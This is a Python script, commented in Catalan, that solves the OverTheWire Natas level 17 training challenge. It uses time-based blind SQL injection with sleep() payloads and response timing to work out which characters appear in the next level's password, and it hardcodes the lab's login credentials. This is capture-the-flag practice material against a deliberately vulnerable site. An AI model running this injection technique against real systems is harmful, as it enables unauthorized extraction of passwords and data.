import requests,string

# Configuració de la URL i credencials
url = "http://natas17.natas.labs.overthewire.org/"
username = "natas17"
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
# Generació de caràcters per a la cerca
characters = ''.join([string.digits,string.ascii_letters])
# Headers per a la sol·licitud HTTP POST
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

# Llista per emmagatzemar els caràcters trobats
Passchar = []

# Bucle per iterar sobre cada caràcter
for i in characters:
    # Construcció del payload amb injecció SQL per a provar cada caràcter de la contrasenya
    payload = 'username=natas18%22+and+password+like+binary+%22%25{0}%25%22+and+sleep%281%29+%23'.format(i)
     # Realització de la sol·licitud HTTP POST amb el payload, les credencials i els headers
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=(username,password), data = payload, headers = headers)
    # Comprovació del temps de resposta del servidor 
    if (r.elapsed.seconds >= 1):
        # Si és correcte, afegim el caràcter a la llista i l'imprimim
        Passchar.append(i)
        print(i)

# Imprimim la llista de caràcters trobats        
print(Passchar)